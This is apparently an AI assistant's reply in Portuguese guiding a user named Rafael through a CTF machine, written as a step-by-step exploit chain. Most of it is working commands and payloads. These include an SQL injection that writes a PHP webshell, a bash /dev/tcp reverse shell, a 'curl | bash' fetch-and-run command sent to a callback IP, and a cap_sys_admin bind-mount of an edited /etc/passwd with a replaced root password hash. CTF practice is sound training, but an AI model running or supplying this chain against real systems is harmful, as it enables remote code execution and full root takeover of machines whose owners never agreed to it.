
Claro, Rafael! Vamos **refazer tudo passo a passo** agora **seguindo exatamente como está no PDF** que você mandou, com foco total em:

- ✅ Usar o **Burp Suite**, como foi feito no material;
    
- ✅ Fazer o **URL encode corretamente**;
    
- ✅ Seguir o fluxo exato: SQLi → webshell → reverse shell → privesc;
    
- ✅ Explicações mais precisas, técnicas e no contexto da prática CTF.
    

---

## 🧠 **Cenário: máquina CTF com API Slim PHP**

---

## 🔹 **PASSO 1 – Enumeração com Nmap**

**Objetivo**: Descobrir portas e serviços.

```bash
nmap -sC -sV -p- -T4 <IP-ALVO>
```

📌 Vai encontrar um serviço web rodando, geralmente na porta `80`.

---

## 🔹 **PASSO 2 – Acesso ao site**

Ao abrir no navegador `http://<IP-ALVO>/`, o site mostra:

```
{"message":"Route not found"}
```

✅ Isso indica que é uma **API RESTful**.  
🎯 Precisamos descobrir as rotas.

---

## 🔹 **PASSO 3 – Fuzzing com SecLists (Descobrir rotas)**

```bash
ffuf -u http://<IP-ALVO>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt
```

📌 Descobrimos uma rota como:

```
/_ul/usuarios/{id}
```

---

## 🔹 **PASSO 4 – Teste manual da rota**

```bash
curl http://<IP-ALVO>/_ul/usuarios/1
```

Você recebe um JSON com os dados do usuário 1.  
Testando `id=2`, ele revela uma **flag**.

---

## 🔹 **PASSO 5 – Entendendo o backend (Slim Framework)**

Via code review (em um `backup.zip` baixado da aplicação), o write-up mostra que:

```php
$app->get('/_ul/usuarios/{id}', function ($request, $response, $args) {
    $sql = "SELECT * FROM usuarios WHERE id = $args[id]";
    ...
});
```

🔴 **Vulnerável a SQL Injection**, pois **não usa prepared statements**.

---

## 🔹 **PASSO 6 – SQL Injection para RCE**

### 🎯 Objetivo: escrever uma **webshell PHP** no servidor usando SQLi + `INTO OUTFILE`.

---

### 1. Payload original:

```sql
3 UNION SELECT 1,"<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/classes/vert16x.class.php'
```

---

### 2. Encodar com URL Encode

Usando [https://www.urlencoder.io/](https://www.urlencoder.io/), o resultado é:

```
3%20UNION%20SELECT%201%2C%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22%20INTO%20OUTFILE%20%27%2Fvar%2Fwww%2Fhtml%2Fclasses%2Fvert16x.class.php%27
```

---

### 3. Enviar via **Burp Suite** (como no PDF)

- Abra o **Burp Suite**
    
- Intercepte o navegador
    
- Faça a requisição para:
    

```
http://<IP-ALVO>/_ul/usuarios/3%20UNION%20SELECT%201%2C%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22%20INTO%20OUTFILE%20%27%2Fvar%2Fwww%2Fhtml%2Fclasses%2Fvert16x.class.php%27
```

- Envie via **Burp Repeater**
    

✅ Se a resposta for `null`, deu certo → a **webshell foi criada**.

---

## 🔹 **PASSO 7 – Usando a WebShell para testar**

No navegador ou via Burp, faça:

```http
GET /_ul/vert16x?cmd=id
```

✅ Retorna algo como:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 🔹 **PASSO 8 – Reverse Shell usando `curl | sh`**

### 1. Crie `shell.sh` no seu Kali:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.0.21.49/4444 0>&1
```

⚠️ **Use seu IP real da VPN/Kali.**

---

### 2. Suba o servidor para servir esse arquivo:

```bash
cd onde/está/shell.sh
python3 -m http.server 80
```

---

### 3. Netcat ouvindo:

```bash
nc -lvnp 4444
```

---

### 4. Enviar via WebShell com **URL Encode** (como no PDF):

```bash
cmd=curl%20http%3A%2F%2F10.0.21.49%2Fshell.sh%7Cbash
```

---

### 5. Requisição completa via Burp:

```http
GET /_ul/vert16x?cmd=curl%20http%3A%2F%2F10.0.21.49%2Fshell.sh%7Cbash
```

📌 Se o `python3 -m http.server` mostra um `GET /shell.sh`, e o Netcat conecta, você tem shell reversa!

---

## 🔹 **PASSO 9 – Upgrade do Shell para TTY**

No shell recebido:

```bash
python -c "import pty;pty.spawn('/bin/bash')" 
Ctrl+Z
stty raw -echo;fg 
Enter 
export TERM=xterm
```

---

## 🔹 **PASSO 10 – Privesc via Linux Capabilities (`cap_sys_admin`)**

## ✅ Etapa: Executar o **LinPEAS** para encontrar uma brecha de privesc

### 🔹 **1. No seu Kali (máquina de ataque):**

Entre no diretório que quiser e baixe o LinPEAS:

bash

CopiarEditar

`wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh`

Depois, rode um servidor HTTP:

bash

CopiarEditar

`python3 -m http.server 80`

Você verá:

nginx

CopiarEditar

`Serving HTTP on 0.0.0.0 port 80 ...`


---

### 🔹 **2. Na máquina comprometida (na shell do alvo):**
importante esta em um diretorio onde podda escrever por exemplo /tmp
📥 Baixe o script com `curl`:

bash

CopiarEditar

`curl http://10.0.21.49/linpeas.sh -o linpeas.sh`

> ✅ Use **seu IP real de VPN/Kali** (confirme com `ip a` se necessário).

---

### 🔹 **3. Dê permissão de execução:**

bash

CopiarEditar

`chmod +x linpeas.sh`

---

### 🔹 **4. Execute o LinPEAS:**

bash

CopiarEditar

`./linpeas.sh`


---



---

## ✅ Etapas Exatas — Igual ao PDF e Book HackTricks

### 📌 Objetivo:

Editar **o arquivo real `/etc/passwd`** diretamente e colocar o novo hash na linha do `root`.

---

### 🧨 Desafio:

Você está com permissão baixa e **não consegue editar o `/etc/passwd` diretamente** com `nano`, `vim` ou `echo`, **mas o Python 2.7 tem `cap_sys_admin`**, o que te permite montar outro arquivo sobre ele — isso é o que o método explora.

---

## ✅ Agora passo a passo com base no HackTricks

---

### 🔹 1. Gere a senha com OpenSSL (você já fez):

```bash
openssl passwd -1 -salt abc vert16xx
```

Resultado:

```
$1$abc$2H0JEHV8dgQ1XqM3KjN3Y0
```

---

### 🔹 2. Copie o conteúdo real do `/etc/passwd` para um arquivo temporário

```bash
cp /etc/passwd /tmp/passwd
```

---

### 🔹 3. Edite o arquivo copiado

Como você não tem `nano` nem `vim`, use o `sed` para trocar o hash da linha `root:`:

```bash
sed -i 's|^root:[^:]*:|root:$1$abc$2H0JEHV8dgQ1XqM3KjN3Y0:|' /tmp/passwd
```

Isso substitui a senha do root pelo seu hash.

✅ Agora veja o resultado:

```bash
head -n 1 /tmp/passwd
```

Deve aparecer:

```
root:$1$abc$2H0JEHV8dgQ1XqM3KjN3Y0:0:0:root:/root:/bin/bash
```

---

### 🔹 4. Crie o exploit para montar `/tmp/passwd` sobre `/etc/passwd`

```bash
echo 'import ctypes; ctypes.CDLL("libc.so.6").mount("/tmp/passwd", "/etc/passwd", None, 4096, None)' > /tmp/exploit.py
```

⚠️ `4096` é a flag `MS_BIND`, como indicado no HackTricks.

---

### 🔹 5. Execute com o Python que tem a capability

```bash
/usr/bin/python2.7 /tmp/exploit.py
```

---

### 🔹 6. Teste o login como root

```bash
su root
```

Senha:

```
vert16xx
```

Se funcionar, você é root de verdade.

---

## 🧠 Por que agora deve funcionar?

- Você **realmente alterou a linha do root** com `sed`, em vez de criar do zero
    
- Usou **mount bind** com a flag `4096`, como no HackTricks
    
- E executou o Python certo (`/usr/bin/python2.7`) com `cap_sys_admin+ep`
    

---

Me manda o resultado de:

```bash
head -n 1 /tmp/passwd
```

E depois se o `su root` funcionou. Estamos muito perto — agora 100% em linha com o PDF e HackTricks. 👊